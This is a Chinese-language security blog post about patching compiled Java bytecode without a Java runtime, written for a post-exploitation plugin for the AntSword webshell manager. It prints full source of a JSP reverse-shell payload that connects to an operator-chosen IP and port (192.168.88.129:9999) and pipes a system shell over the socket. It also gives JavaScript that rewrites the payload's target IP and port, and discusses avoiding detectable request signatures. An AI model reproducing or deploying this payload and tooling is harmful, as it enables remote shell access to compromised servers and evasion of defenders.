1
⽆java环境修改字节码
@yzddmr6
⾃从实习之后发现⾃⼰缺乏的东⻄还有很多，跟其他优秀的⼈相⽐还有很⼤的差距，所以最近⼀直在学习
充电，⽂章也写的少了。上次巅峰极客线下赛跟yan表哥⾯了基，⼀起磕了⽠⼦聊了聊天。结合当时的⽐赛
情况回来之后想搓⼀个蚁剑的后渗透插件，今天想跟⼤家分享⼀下其中的⼀个点：⽆java环境如何修改字
节码。
在蚁剑改造计划之实现JSP⼀句话中，当时为了解决硬编码字节码的问题采⽤了额外参数的⽅式来传参。
但是同时带来的问题就是键名的固定跟额外带来的编码问题，很容易成为⼀个特征。
例如
蚁剑没有java环境，所以没办法像冰蝎⼀样调⽤asm框架来修改字节码。但是我们也不需要asm框架那么
强⼤的功能，实际上只需要修改其中的⼀个字符串的值就可以了，那么怎么实现呢？这个要从字节码的结
构说起。
这⾥以As_Exploits中的jsp反弹shell的payload为例
前⾔
正⽂
需求
1 POST:   ant=xxxxxxxxxxxxxxx&var1=/bin/bash&var2=whoami
Java字节码结构
 1 import java.io.*;
 2 import java.net.Socket;
 3
 4 public class ShellReverseTCP extends Thread {
 5
 6     InputStream zj;
 7     OutputStream sd;
 8     public static String ip;
 9     public static String port;
10
11     ShellReverseTCP(InputStream zj, OutputStream sd) {
12         this.zj = zj;
2
13         this.sd = sd;
14     }
15
16     public ShellReverseTCP() {
17
18     }
19     @Override
20     public boolean equals(Object obj){
21         ip="targetIP";
22         port="targetPORT";
23         try {
24             RunShellReverseTCP();
25             return true;
26         }catch (Exception e){
27             return false;
28         }
29
30     }
31
32     public static void main(String[] args) {
33         ip="192.168.88.129";
34         port="9999";
35         ShellReverseTCP shellReverseTCP = new ShellReverseTCP();
36         shellReverseTCP.RunShellReverseTCP();
37     }
38
39     public void RunShellReverseTCP() {
40         try {
41             String ShellPath;
42             if (System.getProperty("os.name").toLowerCase().index
Of("windows") == -1) {
43                 ShellPath = new String("/bin/sh");
44             } else {
45                 ShellPath = new String("cmd.exe");
46             }
47
48             Socket socket = new Socket(ip, Integer.parseInt(port)
);
49             Process process = Runtime.getRuntime().exec(ShellPath
);
3
main函数是调试⽤的不⽤管，⼊⼝是equals函数，我们的⽬的就是把其中的targetIP跟targetPORT替换
为我们的⽬标IP跟端⼝。
⽤010editor打开编译后的字节码⽂件查看。
50             (new ShellReverseTCP(process.getInputStream(), socket
.getOutputStream())).start();
51             (new ShellReverseTCP(socket.getInputStream(), process
.getOutputStream())).start();
52         } catch (Exception e) {
53         }
54     }
55
56
57     public void run() {
58         BufferedReader yx = null;
59         BufferedWriter jah = null;
60         try {
61             yx = new BufferedReader(new InputStreamReader(this.zj
));
62             jah = new BufferedWriter(new OutputStreamWriter(this.
sd));
63             char buffer[] = new char[8192];
64             int length;
65             while ((length = yx.read(buffer, 0, buffer.length)) > 
0) {
66                 jah.write(buffer, 0, length);
67                 jah.flush();
68             }
69         } catch (Exception e) {
70         }
71         try {
72             if (yx != null)
73                 yx.close();
74             if (jah != null)
75                 jah.close();
76         } catch (Exception e) {
77         }
78     }
79 }
4
最开始的CAFEBABE叫做魔数，⽤来标志这是⼀个字节码⽂件。
00 00 00 34是版本号，0x34转为10进制是52，查表知是jdk1.8。
5
后⾯还有import的相关类的信息，因为不是重点，这⾥不再过多说明，快进到常量池。
常量池中的每⼀项都是⼀个表，其项⽬类型共有14种，如下表格所示：
类型
标志
描述
CONSTANT_utf8_info
1
UTF-8编码的字符串
CONSTANT_Integer_info
3
整形字⾯量
CONSTANT_Float_info
4
浮点型字⾯量
6
这14种类型的结构各不相同，如下表格所示：
类型
标志
描述
CONSTANT_Long_info
5
⻓整型字⾯量
CONSTANT_Double_info
6
双精度浮点型字⾯量
CONSTANT_Class_info
7
类或接⼝的符号引⽤
CONSTANT_String_info
8
字符串类型字⾯量
CONSTANT_Fieldref_info
9
字段的符号引⽤
CONSTANT_Methodref_info
10
类中⽅法的符号引⽤
CONSTANT_InterfaceMethod
ref_info
11
接⼝中⽅法的符号引⽤
CONSTANT_NameAndType_i
nfo
12
字段或⽅法的符号引⽤
CONSTANT_MethodHandle_i
nfo
15
表示⽅法句柄
CONSTANT_MothodType_inf
o
16
标志⽅法类型
CONSTANT_InvokeDynamic_i
nfo
18
表示⼀个动态⽅法调⽤点
7
从上⾯的表格可以看到，虽然每⼀项的结构都各不相同，但是他们有个共同点，就是每⼀项的第⼀个字节
都是⼀个标志位，标识这⼀项是哪种类型的常量。
我们关注的应该是CONSTANT_utf8_info跟CONSTANT_String_info。如果变量是第⼀次被定义的时候
是⽤CONSTANT_utf8_info标志，第⼆次使⽤的时候就变成了CONSTANT_String_info，即只需要tag跟
注：上⾯的表格的单位是错的，应该是byte不是bit，不知道哪⾥的以讹传讹⼀直流传了下来。
8
⾯向字符串的索引。
也就是说关键的结构就是这个
其实跟PHP的序列化很相似，⾸先来个标志位表示变量的类型，然后是变量的⻓度，最后是变量的内容。
结合⽂件来看
targetIP共占了8个byte，也就是16个hex的位。所以前⾯两个byte是00 08。然后再之前的⼀个byte是
01，表示这是⼀个CONSTANT_utf8_info。
既然知道了其结构，那么修改的办法也就呼之欲出。除了修改变量的hex，只需要再把前⾯的变量⻓度给改
⼀下就可以了。
把yan表哥的代码抽出来修改⼀下
如何修改
 1 function replaceClassStringVar(b64code, oldvar, newvar) {
 2     let code = Buffer.from(b64code, 'base64');//解码
 3     let hexcode = code.toString('hex');//转为16进制
 4     let hexoldvar = Buffer.from(oldvar).toString('hex');//转为16进
制
 5     let oldpos = hexcode.indexOf(hexoldvar);
 6     if (oldpos > -1) {//判断字节码中是否包含⽬标字符串
 7       let newlength = decimalToHex(newvar.length, 4);//计算新字符串
⻓度
 8       let retcode = `${hexcode.slice(0, oldpos - 4)}${newlength}
${Buffer.from(newvar).toString('hex')}${hexcode.slice(oldpos + he
xoldvar.length)}`;//把原来字节码的前后部分截出来，中间拼上新的⻓度跟内容
 9       return Buffer.from(retcode, 'hex').toString('base64');//bas
e64编码
10     }
11     console.log('nonono')
12     return b64code;
9
⽤命令还原⼀下⽂件
看⼀下修改后的结果
192.168.88.129总共是14个byte，换成16进制就是0xe，刚好符合。
实际中是否能⽤呢？
13   }
14
15   function decimalToHex(d, padding) {
16     var hex = Number(d).toString(16);
17     padding = typeof (padding) === "undefined" || padding === nul
l ? padding = 2 : padding;
18     while (hex.length < padding) {
19       hex = "0" + hex;//⼩于padding⻓度就填充0
20     }
21     return hex;
22   }
23
24 content=`xxxxxxxxxxxxx`//要替换的字节码
25
26 content=replaceClassStringVar(content,'targetIP','192.168.88.129'
)
27 content=replaceClassStringVar(content,'targetPORT','9999')
28 console.log(content)
1 echo -n xxxxxx |baes64 -d |tee after.class
10
11
回⻋，获得会话，说明修改是有效的。
As_Exploits还在开发中，不得不说很麻烦，同⼀个功能要写asp/aspx/php/jsp四份代码。后端还可以写
写，前端是真的要现学，不过还是可以期待⼀下。
最后